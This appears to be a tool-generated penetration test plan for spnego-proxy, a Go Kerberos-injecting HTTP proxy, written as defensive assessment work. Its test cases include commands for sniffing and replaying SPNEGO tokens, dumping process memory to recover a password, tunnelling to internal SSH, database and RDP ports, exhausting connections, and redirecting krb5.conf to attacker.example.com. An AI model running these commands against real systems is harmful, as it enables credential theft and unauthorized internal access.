# SPNEGO-PROXY Penetration Test Plan

**Generated**: 2026-02-28T22:45:00Z
**Skill Version**: 3.0.3 (20260209a)
**Assessment Scope**: /home/sweeand/andrewesweet/spnego-proxy

---

## Scope

### Target Application
- **Name**: spnego-proxy
- **Type**: Forward HTTP proxy with SPNEGO/Kerberos authentication injection
- **Language**: Go 1.24 with CGo (macOS)
- **Entry Points**: TCP listener (default 127.0.0.1:8080), CLI flags, filesystem, CGo boundary
- **Modules**: 7 (Proxy Core, Error Types, gokrb5 Auth, macOS GSS-API Go, macOS GSS-API C, Circuit Breaker, Platform Stubs)

### Test Objectives
1. Validate all 13 identified risks (VR-001 through VR-013)
2. Exercise both identified attack chains (AC-001, AC-002)
3. Verify effectiveness of existing security controls
4. Provide evidence for mitigation prioritization

---

## Attack Path Coverage Summary

| P6 Artifact | Count | Covered | Coverage |
|-------------|-------|---------|----------|
| Attack Paths (VR-xxx with POC) | 5 | 5 | 100% |
| Attack Chains (AC-xxx) | 2 | 2 | 100% |
| Validated Risks (VR-xxx) | 13 | 13 | 100% |

---

## Test Cases

### TC-001: Unauthenticated Proxy Access

- **Attack Path**: VR-001 (No Client Authentication)
- **Risk**: VR-001 (CVSS 7.5)
- **POC**: POC-001
- **Priority**: P1

**Prerequisites**:
- spnego-proxy running with default configuration
- Valid Kerberos credentials configured for proxy
- Network access to proxy listener

**Steps**:
1. Start spnego-proxy with default settings: `./spnego-proxy -proxy upstream:3128 -spn HTTP/upstream`
2. From a separate process on localhost, issue an HTTP request through the proxy:
   ```bash
   curl -v -x http://127.0.0.1:8080 http://example.com
   ```
3. Observe the upstream proxy logs or capture traffic to verify the Proxy-Authorization header is present
4. Repeat from a non-localhost IP (if proxy is bound to 0.0.0.0):
   ```bash
   curl -v -x http://<proxy-host>:8080 http://example.com
   ```

**Expected Result**:
- Request succeeds and includes `Proxy-Authorization: Negotiate <token>` header
- Any process on localhost can use the proxy without authentication
- If bound to 0.0.0.0, remote hosts also gain access

**Verification**:
- Confirm Proxy-Authorization header present in upstream request
- Confirm no client authentication challenge was issued
- Confirm the SPNEGO token belongs to the operator's identity

**Pass Criteria**: Request forwarded with operator's SPNEGO token regardless of client identity

---

### TC-002: SPNEGO Token Interception

- **Attack Path**: VR-002 (SPNEGO Token Exposure)
- **Risk**: VR-002 (CVSS 7.1)
- **POC**: POC-002
- **Priority**: P1

**Prerequisites**:
- spnego-proxy running with upstream on a non-loopback network
- Network capture capability on proxy-upstream segment
- tcpdump or Wireshark installed

**Steps**:
1. Start packet capture on the proxy-upstream network:
   ```bash
   tcpdump -i eth0 -A port 3128 -w capture.pcap
   ```
2. Send a request through the proxy:
   ```bash
   curl -x http://127.0.0.1:8080 http://example.com
   ```
3. Analyze the capture for Proxy-Authorization headers:
   ```bash
   tcpdump -r capture.pcap -A | grep "Proxy-Authorization"
   ```
4. Extract the base64-encoded SPNEGO token
5. Attempt token replay within the 5-minute Kerberos validity window

**Expected Result**:
- `Proxy-Authorization: Negotiate YII...` visible in plaintext capture
- Token is a valid base64-encoded SPNEGO blob
- Token may be replayable within its validity window

**Verification**:
- Confirm SPNEGO token visible in packet capture
- Decode base64 to verify it contains a valid SPNEGO/Kerberos message

**Pass Criteria**: SPNEGO token captured in plaintext from network traffic

---

### TC-003: Password Extraction from Process Memory

- **Attack Path**: VR-003 (Password in Memory)
- **Risk**: VR-003 (CVSS 5.5)
- **POC**: POC-003
- **Priority**: P2

**Prerequisites**:
- spnego-proxy running with password-based authentication (-password-file)
- Local access as same user or root
- gcore or /proc filesystem access

**Steps**:
1. Start proxy with password-based auth:
   ```bash
   echo "testpassword" > /tmp/pw.txt && chmod 600 /tmp/pw.txt
   ./spnego-proxy -proxy upstream:3128 -user testuser -realm EXAMPLE.COM \
     -password-file /tmp/pw.txt -config /etc/krb5.conf
   ```
2. Dump process memory:
   ```bash
   gcore $(pidof spnego-proxy)
   ```
3. Search for the password in the dump:
   ```bash
   strings core.* | grep "testpassword"
   ```
4. Alternative: read /proc memory directly:
   ```bash
   cat /proc/$(pidof spnego-proxy)/maps  # Find heap regions
   dd if=/proc/$(pidof spnego-proxy)/mem bs=1 skip=<heap_start> count=<size> | strings | grep "testpassword"
   ```

**Expected Result**:
- Password string "testpassword" found in process memory dump
- Password persists for the entire process lifetime

**Verification**:
- Confirm password present in memory dump
- Confirm it is stored as a Go string (immutable, not zeroable)

**Pass Criteria**: Kerberos password recoverable from process memory

---

### TC-004: Raw Relay Bypass via Malformed Response

- **Attack Path**: VR-004 (Raw Relay Bypass)
- **Risk**: VR-004 (CVSS 5.3)
- **POC**: POC-004
- **Priority**: P2

**Prerequisites**:
- spnego-proxy running
- Ability to control or simulate upstream proxy responses

**Steps**:
1. Set up a mock upstream that sends an unparseable response:
   ```bash
   # Terminal 1: Mock upstream
   echo -e "INVALID RESPONSE\r\n\r\nMalicious unvalidated content" | nc -l 3128
   ```
2. Configure proxy to point to the mock upstream:
   ```bash
   ./spnego-proxy -proxy 127.0.0.1:3128
   ```
3. Send a request through the proxy:
   ```bash
   curl -v -x http://127.0.0.1:8080 http://example.com
   ```
4. Observe the response received by the client

**Expected Result**:
- Proxy falls back to raw io.Copy relay
- Client receives the raw unvalidated bytes "INVALID RESPONSE...Malicious unvalidated content"
- No Content-Length validation, Via header, or Proxy-Auth stripping applied

**Verification**:
- Confirm raw bytes are relayed to client
- Confirm no proxy-level headers (Via, Proxy-Status) are injected in the response

**Pass Criteria**: Unparseable response bypasses proxy validation and reaches client raw

---

### TC-005: CONNECT Tunnel to Arbitrary Port

- **Attack Path**: VR-005 (CONNECT to Arbitrary Ports)
- **Risk**: VR-005 (CVSS 5.3)
- **POC**: POC-005
- **Priority**: P2

**Prerequisites**:
- spnego-proxy running without -connect-ports flag
- An internal service accessible from the upstream proxy's network

**Steps**:
1. Start proxy without port restrictions:
   ```bash
   ./spnego-proxy -proxy upstream:3128
   ```
2. Attempt CONNECT to a non-HTTPS port:
   ```bash
   printf 'CONNECT internal-host:22 HTTP/1.1\r\nHost: internal-host:22\r\n\r\n' | \
     nc 127.0.0.1 8080
   ```
3. Verify tunnel is established (HTTP 200 response)
4. Try additional ports:
   ```bash
   # Database port
   printf 'CONNECT db-server:5432 HTTP/1.1\r\nHost: db-server:5432\r\n\r\n' | \
     nc 127.0.0.1 8080
   # RDP port
   printf 'CONNECT win-server:3389 HTTP/1.1\r\nHost: win-server:3389\r\n\r\n' | \
     nc 127.0.0.1 8080
   ```

**Expected Result**:
- CONNECT tunnel established to any requested port
- HTTP 200 Connection Established response returned
- Full TCP connectivity through the authenticated tunnel

**Verification**:
- Confirm tunnel to port 22 succeeds
- Confirm tunnel to port 5432 succeeds
- Confirm tunnel to port 3389 succeeds

**Pass Criteria**: CONNECT tunnels succeed to arbitrary ports when no restriction is configured

---

### TC-006: Idle Connection Slot Exhaustion

- **Risk**: VR-006 (CVSS 5.3)
- **Priority**: P2

**Prerequisites**:
- spnego-proxy running with default max-conns (512)
- bash/curl available

**Steps**:
1. Establish many idle CONNECT tunnels:
   ```bash
   for i in $(seq 1 520); do
     (printf 'CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\n\r\n' | \
       nc -q -1 127.0.0.1 8080) &
   done
   ```
2. Wait 60 seconds (no idle timeout should close them)
3. Attempt a new legitimate connection:
   ```bash
   curl -x http://127.0.0.1:8080 http://example.com
   ```

**Expected Result**:
- Idle tunnels remain open indefinitely
- After 512 connections, new connections are rejected by LimitListener
- Legitimate traffic is denied

**Verification**:
- Confirm connections remain open after extended idle period
- Confirm new connection is rejected when limit is reached

**Pass Criteria**: Idle tunnels consume connection slots without timeout

---

### TC-007: Entropy Fallback Prediction

- **Risk**: VR-007 (CVSS 3.1)
- **Priority**: P3

**Prerequisites**:
- Modified build that forces crypto/rand failure (for testing only)

**Steps**:
1. Build a test version that simulates crypto/rand failure
2. Start the proxy and observe the Via header pseudonym
3. Predict the next pseudonym based on timestamp

**Expected Result**:
- Via pseudonym is derived from time.Now().UnixNano()
- Pseudonym is predictable given approximate time knowledge

**Verification**:
- Confirm fallback path produces timestamp-based pseudonym
- Confirm pseudonym can be predicted within a reasonable window

**Pass Criteria**: Via pseudonym is predictable when using timestamp fallback

---

### TC-008: TE/CL Smuggling Attempt

- **Risk**: VR-008 (CVSS 5.9)
- **Priority**: P2

**Prerequisites**:
- spnego-proxy running
- Custom HTTP request crafting tool (nc or python)

**Steps**:
1. Send a request with both Transfer-Encoding and Content-Length:
   ```bash
   printf 'GET http://example.com HTTP/1.1\r\nHost: example.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 100\r\n\r\n0\r\n\r\n' | \
     nc 127.0.0.1 8080
   ```
2. Verify the proxy removes Content-Length
3. Check proxy logs for any TE/CL conflict detection

**Expected Result**:
- Content-Length header is removed (TE takes precedence per RFC 9112)
- Request is forwarded correctly to upstream
- Currently no log entry for the conflict (mitigation would add logging)

**Verification**:
- Capture upstream request and confirm Content-Length is absent
- Confirm Transfer-Encoding is preserved

**Pass Criteria**: TE/CL conflict resolved correctly; Content-Length removed

---

### TC-009: Kerberos Configuration Tampering

- **Risk**: VR-009 (CVSS 5.3)
- **Priority**: P2

**Prerequisites**:
- Write access to the krb5.conf file used by the proxy
- A rogue KDC for testing

**Steps**:
1. Create a writable krb5.conf:
   ```bash
   cp /etc/krb5.conf /tmp/krb5.conf
   chmod 666 /tmp/krb5.conf
   ```
2. Start proxy with the writable config:
   ```bash
   ./spnego-proxy -config /tmp/krb5.conf -proxy upstream:3128
   ```
3. Modify the KDC address to point to a rogue server:
   ```bash
   sed -i 's/kdc = .*/kdc = attacker.example.com/' /tmp/krb5.conf
   ```
4. Trigger a new Kerberos authentication (e.g., after ticket expiry)

**Expected Result**:
- Proxy loads the modified krb5.conf on next auth attempt
- Authentication is redirected to the rogue KDC
- No warning about file permissions is logged (current behavior)

**Verification**:
- Confirm proxy uses modified KDC address
- Confirm no integrity check prevents the modification

**Pass Criteria**: Modified krb5.conf is accepted without warning

---

### TC-010: Circuit Breaker Denial of Service

- **Risk**: VR-010 (CVSS 5.3)
- **Priority**: P2

**Prerequisites**:
- spnego-proxy running
- Ability to cause authentication failures

**Steps**:
1. Send 3 requests that cause auth failures in rapid succession (e.g., invalid credentials, expired ticket)
2. Immediately after, send a legitimate request:
   ```bash
   curl -v -x http://127.0.0.1:8080 http://example.com
   ```
3. Observe that the circuit breaker is open

**Expected Result**:
- After 3 consecutive auth failures, circuit breaker opens
- All subsequent requests fail for 30 seconds
- All clients are affected (shared circuit breaker)

**Verification**:
- Confirm circuit breaker state is "open" after 3 failures
- Confirm legitimate requests are rejected during cooldown

**Pass Criteria**: 3 auth failures block all proxy traffic for 30 seconds

---

### TC-011: CGo Boundary Input Validation

- **Risk**: VR-011 (CVSS 5.0)
- **Priority**: P2

**Prerequisites**:
- macOS build with CGo enabled
- Testing framework

**Steps**:
1. Call GetToken with an extremely long SPN:
   ```go
   g := &gssProvider{}
   _, err := g.GetToken(strings.Repeat("A", 65536))
   ```
2. Call GetToken with special characters:
   ```go
   _, err := g.GetToken("HTTP/\x00null\x00bytes")
   ```
3. Call GetToken with empty string:
   ```go
   _, err := g.GetToken("")
   ```

**Expected Result**:
- No crashes or panics
- Error returned for invalid inputs
- C error buffer (256 bytes) handles long error messages correctly

**Verification**:
- Run fuzz tests for extended period
- Confirm no memory corruption via Address Sanitizer (if available)

**Pass Criteria**: No crashes, panics, or memory corruption with adversarial inputs

---

### TC-012: Security Event Log Verification

- **Risk**: VR-012 (CVSS 3.1)
- **Priority**: P3

**Prerequisites**:
- spnego-proxy running with JSON log output

**Steps**:
1. Trigger various security-relevant events:
   - Authentication failure
   - CONNECT tunnel request
   - Circuit breaker trip
   - Client connection
2. Examine log output for security event classification

**Expected Result**:
- Security events are logged but lack event_type classification
- All localhost clients appear as 127.0.0.1 (no process attribution)
- No differentiation between security and operational events

**Verification**:
- Confirm absence of event_type field in log entries
- Confirm all security events are logged (content exists, classification missing)

**Pass Criteria**: Security events are logged but lack classification

---

### TC-013: KRB5CCNAME Manipulation

- **Risk**: VR-013 (CVSS 5.0)
- **Priority**: P2

**Prerequisites**:
- macOS build with GSS-API
- Ability to set environment variables for the proxy process

**Steps**:
1. Create an alternate credential cache:
   ```bash
   kinit -c /tmp/attacker_ccache attacker@REALM
   ```
2. Start the proxy with the manipulated cache:
   ```bash
   KRB5CCNAME=/tmp/attacker_ccache ./spnego-proxy -proxy upstream:3128
   ```
3. Send a request through the proxy
4. Verify which identity is used for SPNEGO tokens

**Expected Result**:
- Proxy authenticates with the attacker's credentials from the alternate cache
- No warning logged about non-standard KRB5CCNAME value

**Verification**:
- Confirm SPNEGO token contains the attacker's identity
- Confirm no validation or logging of KRB5CCNAME

**Pass Criteria**: Alternate credential cache accepted without validation

---

## Attack Chain Scenarios

### Scenario 1: Credential Harvesting (AC-001)

- **Chain**: VR-002 (token exposure) leading to token replay
- **Test Cases**: TC-002
- **Combined CVSS**: 8.1

**End-to-End Steps**:
1. Position on the proxy-upstream network (TC-002 step 1)
2. Capture SPNEGO tokens from Proxy-Authorization headers (TC-002 steps 2-4)
3. Replay captured token against the upstream proxy within 5-minute validity window (TC-002 step 5)
4. Verify authenticated access as the operator

**Success Criteria**: Complete chain from network position to authenticated access as operator

---

### Scenario 2: Lateral Movement via CONNECT (AC-002)

- **Chain**: VR-001 (no client auth) + VR-005 (open CONNECT) leading to internal service access
- **Test Cases**: TC-001, TC-005
- **Combined CVSS**: 7.7

**End-to-End Steps**:
1. Connect to proxy from localhost without authentication (TC-001 steps 2-3)
2. Issue CONNECT request to internal service port (TC-005 steps 2-3)
3. Verify tunnel is established with operator's SPNEGO authentication
4. Access internal service through the authenticated tunnel

**Success Criteria**: Complete chain from localhost process to internal service access through authenticated proxy tunnel

---

## Deferred Tests

| Path/Chain | Reason | Planned Date |
|------------|--------|--------------|
| None | All test cases documented | N/A |

---

## Tools Required

| Tool | Purpose | Test Cases |
|------|---------|------------|
| curl | HTTP proxy requests, CONNECT testing | TC-001, TC-002, TC-005, TC-006, TC-010 |
| nc (netcat) | Raw TCP connections, mock upstream | TC-004, TC-005, TC-006, TC-008 |
| tcpdump | Network packet capture | TC-002 |
| Wireshark | Packet analysis and SPNEGO token extraction | TC-002 |
| gcore | Process memory dump | TC-003 |
| strings | Binary string extraction | TC-003 |
| Go test framework | Unit and fuzz testing | TC-007, TC-008, TC-011 |
| kinit | Kerberos ticket manipulation | TC-013 |
| sed | File manipulation | TC-009 |
| bash | Scripting for connection exhaustion | TC-006 |

---

## Test Environment

### Minimum Requirements
- Linux or macOS host
- Go 1.24+ toolchain (for building spnego-proxy)
- Kerberos infrastructure (KDC, keytab or password) for authenticated tests
- Network access between test host and upstream proxy
- Root or same-user access for memory dump tests (TC-003)

### Recommended Setup
- **Test host**: Linux/macOS with full development toolchain
- **Mock upstream**: netcat or custom Go test server on separate port
- **Network capture**: tcpdump running on proxy-upstream segment
- **Kerberos**: Test realm with disposable credentials
- **Monitoring**: Proxy stdout/stderr captured to file for log analysis

### Safety Considerations
- All tests should be performed in a non-production environment
- TC-003 (memory dump) requires appropriate authorization
- TC-006 (connection exhaustion) may temporarily degrade service
- TC-009 (config tampering) modifies Kerberos configuration
- TC-013 (credential manipulation) uses alternate credentials

---

## Attack Path Coverage Detail

```yaml
attack_path_coverage:
  p6_input_ref: "P6_validated_risks.yaml"

  attack_paths:
    total_from_p6: 5
    paths_with_test_cases: 5
    coverage_percentage: 100
    path_test_mapping:
      POC-001: [TC-001]
      POC-002: [TC-002]
      POC-003: [TC-003]
      POC-004: [TC-004]
      POC-005: [TC-005]
    uncovered_paths: []
    deferred_paths: []

  attack_chains:
    total_from_p6: 2
    chains_with_scenarios: 2
    coverage_percentage: 100
    chain_scenario_mapping:
      AC-001: "Credential harvesting scenario (Scenario 1)"
      AC-002: "Lateral movement via CONNECT scenario (Scenario 2)"
    uncovered_chains: []

  validated_risks:
    total_from_p6: 13
    risks_with_tests: 13
    coverage_percentage: 100
    risk_test_mapping:
      VR-001: [TC-001]
      VR-002: [TC-002]
      VR-003: [TC-003]
      VR-004: [TC-004]
      VR-005: [TC-005]
      VR-006: [TC-006]
      VR-007: [TC-007]
      VR-008: [TC-008]
      VR-009: [TC-009]
      VR-010: [TC-010]
      VR-011: [TC-011]
      VR-012: [TC-012]
      VR-013: [TC-013]

  overall:
    total_attack_artifacts: 20
    artifacts_covered: 20
    coverage_percentage: 100
```

---

*Generated by Threat Modeling Skill v3.0.3 (20260209a)*
